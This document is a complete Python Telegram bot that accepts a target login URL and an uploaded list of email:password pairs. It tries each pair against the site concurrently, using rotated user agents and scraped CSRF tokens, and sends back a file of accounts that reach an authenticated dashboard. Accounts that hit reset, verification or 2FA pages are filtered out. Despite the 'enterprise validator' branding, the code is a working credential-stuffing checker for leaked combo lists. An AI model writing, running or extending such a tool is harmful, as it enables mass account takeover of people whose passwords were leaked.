#!/usr/bin/env python3
"""
🔥 ENTERPRISE CREDENTIAL VALIDATOR v2.1 - STRICT AUTH ONLY
REAL HTTP AUTH | NO RESET/VERIFY/RECOVERY | FULLY AUTHENTICATED ONLY
"""

import os
import re
import asyncio
import logging
import random
import time
from typing import List, Dict, Optional
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse, urljoin
from collections import defaultdict
import zipfile
from io import BytesIO

import aiohttp
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes,
    filters, ConversationHandler
)
from telegram.constants import ParseMode, ChatAction

# ==================== CONFIG ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "5"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "20"))
DELAY_MIN = float(os.getenv("DELAY_MIN", "1.0"))
DELAY_MAX = float(os.getenv("DELAY_MAX", "3.0"))

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

WAITING_URL, WAITING_FILE = range(2)

# ==================== STRICT FAILURE DETECTION ====================
# These BLOCK valid status - IMMEDIATE FAIL
BLOCKLIST_REDIRECTS = {
    '/reset', '/password/reset', '/forgot-password', '/recover',
    '/verify', '/verification', '/email/verify', '/confirm-email',
    '/2fa', '/mfa', '/authenticator', '/security',
    '/change-password', '/update-password',
    '/account-recovery', '/passwordless', '/magic-link',
    'reset-password', 'verify-email', 'email-verification',
    'two-factor', '2-step', 'security-check'
}

BLOCKLIST_CONTENT = {
    # Password reset pages
    'reset your password', 'forgot password', 'password recovery',
    'change your password', 'update password',
    
    # Email verification
    'verify your email', 'check your email', 'confirmation email',
    'email not verified', 'please verify',
    
    # Security steps
    'two-factor', '2fa', 'authenticator', 'security code',
    'enter verification code', 'sms code', 'one-time code',
    
    # Account issues
    'account locked', 'suspended', 'disabled', 'deactivated'
}

@dataclass
class Credential:
    email: str
    password: str
    original_line: str
    line_number: int

class StrictCredentialValidator:
    def __init__(self):
        self.user_sessions: Dict[int, Dict] = {}
        self.live_creds: Dict[int, List[Credential]] = defaultdict(list)
        self.stats: Dict[int, Dict] = defaultdict(lambda: {'processed': 0, 'live': 0})
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        await update.message.reply_text(
            "🔥 *STRICT VALIDATOR* - FULL AUTH ONLY\n\n"
            "❌ Blocks: password reset, email verify, 2FA, recovery\n"
            "✅ Only: fully authenticated dashboard access\n\n"
            "1️⃣ Send login URL\n2️⃣ Upload `email:password` TXT",
            parse_mode=ParseMode.MARKDOWN
        )
        return WAITING_URL

    async def handle_url(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        url = update.message.text.strip()
        if not self._validate_url(url):
            await update.message.reply_text("❌ Invalid URL")
            return WAITING_URL
        
        user_id = update.effective_user.id
        parsed = urlparse(url)
        self.user_sessions[user_id] = {
            'login_url': url,
            'base_domain': parsed.netloc,
            'login_path': parsed.path or '/',
            'start_time': datetime.now()
        }
        
        await update.message.reply_text(f"✅ Target: `{url}`\n\n📤 Upload credentials TXT", parse_mode=ParseMode.MARKDOWN)
        return WAITING_FILE

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.user_sessions:
            await update.message.reply_text("❌ Start with /start")
            return ConversationHandler.END
        
        document = update.message.document
        if not document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ TXT file only")
            return WAITING_FILE
        
        await context.bot.send_chat_action(chat_id=user_id, action=ChatAction.TYPING)
        
        try:
            file_obj = await context.bot.get_file(document.file_id)
            content = await file_obj.download_as_bytearray()
            creds = self._parse_creds(content.decode())
            
            if not creds:
                await update.message.reply_text("❌ No valid `email:password` found")
                return ConversationHandler.END
            
            self.live_creds[user_id] = []
            self.stats[user_id] = {'processed': 0, 'live': 0, 'total': len(creds)}
            
            progress_msg = await update.message.reply_text(
                f"🚀 *Strict validation starting...*\n"
                f"📊 Total: {len(creds):,}\n"
                f"⚡ Concurrent: {MAX_CONCURRENT}\n"
                f"🔒 Mode: FULL AUTH ONLY\n⏳ Processing...",
                parse_mode=ParseMode.MARKDOWN
            )
            
            asyncio.create_task(self._process_batch(context, user_id, creds, progress_msg.message_id))
            return ConversationHandler.END
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            return ConversationHandler.END

    async def _process_batch(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, 
                           creds: List[Credential], progress_msg_id: int):
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT*2)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [self._strict_validate(session, semaphore, self.user_sessions[user_id], cred, user_id) 
                    for cred in creds]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        live_count = len(self.live_creds[user_id])
        await self._send_final_report(context, user_id, live_count, len(creds))

    async def _strict_validate(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                             session_info: Dict, cred: Credential, user_id: int) -> bool:
        """STRICT FULL AUTHENTICATION VALIDATION"""
        async with semaphore:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Referer': session_info['login_url'],
                'Origin': f"{session_info['login_url'].split('/')[0:3]}".rstrip('/')
            }
            
            try:
                # 1. GET LOGIN PAGE - extract form data
                async with session.get(session_info['login_url'], headers=headers, 
                                     allow_redirects=True) as prep_resp:
                    if prep_resp.status != 200:
                        self.stats[user_id]['processed'] += 1
                        return False
                    
                    prep_html = await prep_resp.text()
                    csrf_token = self._extract_csrf(prep_html)
                    cookies = prep_resp.cookies

                # 2. POST LOGIN - STRICT CHECKS
                login_payload = {
                    'email': cred.email,
                    'password': cred.password,
                    '_token': csrf_token or '',
                    'csrf_token': csrf_token or ''
                }
                
                async with session.post(
                    session_info['login_url'],
                    data=login_payload,
                    headers=headers,
                    cookies=cookies,
                    allow_redirects=True,
                    max_redirects=3
                ) as auth_resp:
                    
                    # CRITICAL STEP 1: BLOCKLIST CHECK - FAIL IMMEDIATELY
                    final_url = str(auth_resp.url).lower()
                    final_content = (await auth_resp.text()).lower()
                    
                    # BLOCK ANY reset/verify/recovery redirect
                    if self._is_blocklisted(final_url, final_content):
                        self.stats[user_id]['processed'] += 1
                        return False
                    
                    # CRITICAL STEP 2: MUST HAVE AUTHENTICATION COOKIES
                    if not self._has_auth_cookies(auth_resp.cookies):
                        self.stats[user_id]['processed'] += 1
                        return False
                    
                    # CRITICAL STEP 3: MUST BE DASHBOARD (not login page)
                    if self._is_still_login_page(final_url, final_content):
                        self.stats[user_id]['processed'] += 1
                        return False
                    
                    # CRITICAL STEP 4: CONFIRM AUTHENTICATED CONTENT
                    if not self._has_authenticated_content(final_content):
                        self.stats[user_id]['processed'] += 1
                        return False
                    
                    # ✅ ALL STRICT CHECKS PASSED
                    logger.info(f"✅ STRICT LIVE: {cred.email}")
                    self.live_creds[user_id].append(cred)
                    self.stats[user_id]['live'] += 1
                    self.stats[user_id]['processed'] += 1
                    return True
                
            except Exception:
                self.stats[user_id]['processed'] += 1
                return False

    def _is_blocklisted(self, url: str, content: str) -> bool:
        """IMMEDIATE FAIL - reset/verify/recovery pages"""
        # URL blocklist
        for block_path in BLOCKLIST_REDIRECTS:
            if block_path in url:
                return True
        
        # Content blocklist  
        for block_text in BLOCKLIST_CONTENT:
            if block_text in content:
                return True
        
        return False

    def _has_auth_cookies(self, cookies) -> bool:
        """MUST have session/auth cookies"""
        auth_names = ['session', 'auth', 'token', '_session', 'user_session', 'access']
        for cookie in cookies.values():
            if any(name in cookie.key.lower() for name in auth_names):
                return True
        return False

    def _is_still_login_page(self, url: str, content: str) -> bool:
        """Still on login page = FAIL"""
        login_indicators = ['login', 'signin', 'log in', 'email', 'password']
        return any(ind in url.lower() or ind in content for ind in login_indicators)

    def _has_authenticated_content(self, content: str) -> bool:
        """MUST have authenticated elements"""
        auth_indicators = [
            '"logout"', '"sign out"', 'signout', 'log out',
            'dashboard', 'profile', 'account settings', 'my account',
            'change password', 'subscription', 'billing', 'orders'
        ]
        return any(indicator in content for indicator in auth_indicators)

    def _extract_csrf(self, html: str) -> Optional[str]:
        patterns = [
            r'name=["\']?_token["\']?\s*value=["\']([^"\']+)',
            r'name=["\']?csrf["\']?\s*value=["\']([^"\']+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1)
        return None

    async def _send_final_report(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, 
                               live_count: int, total: int):
        success_rate = (live_count / total * 100) if total else 0
        report = (
            f"✅ *STRICT VALIDATION COMPLETE*\n\n"
            f"📊 *Results:*\n"
            f"• Total: {total:,}\n"
            f"• ✅ FULL AUTH: {live_count:,}\n"
            f"• 📈 Rate: {success_rate:.2f}%\n"
            f"🔒 *Blocked: reset/verify/2FA/recovery*"
        )
        await context.bot.send_message(user_id, report, parse_mode=ParseMode.MARKDOWN)
        
        if live_count > 0:
            await self._send_results_file(context, user_id)

    async def _send_results_file(self, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        creds = self.live_creds[user_id]
        content = "# ✅ STRICTLY VALIDATED - FULL AUTH ONLY\n\n"
        for cred in creds:
            content += f"{cred.original_line}  # Line {cred.line_number}\n"
        
        buffer = BytesIO(content.encode())
        await context.bot.send_document(
            chat_id=user_id,
            document=buffer,
            filename=f"strict_live_{int(time.time())}.txt",
            caption=f"✅ *{len(creds)} FULLY AUTHENTICATED CREDENTIALS*",
            parse_mode=ParseMode.MARKDOWN
        )

    def _parse_creds(self, content: str) -> List[Credential]:
        creds = []
        for i, line in enumerate(content.splitlines(), 1):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                email, password = email.strip(), password.strip()
                if '@' in email and len(password) >= 4:
                    creds.append(Credential(email, password, line, i))
        return creds

    def _validate_url(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.scheme in ('http', 'https') and parsed.netloc
        except:
            return False

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    validator = StrictCredentialValidator()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", validator.start)],
        states={
            WAITING_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, validator.handle_url)],
            WAITING_FILE: [MessageHandler(filters.Document.ALL, validator.handle_file)],
        },
        fallbacks=[],
    )
    
    app.add_handler(conv_handler)
    print("🔥 STRICT VALIDATOR - FULL AUTH ONLY")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
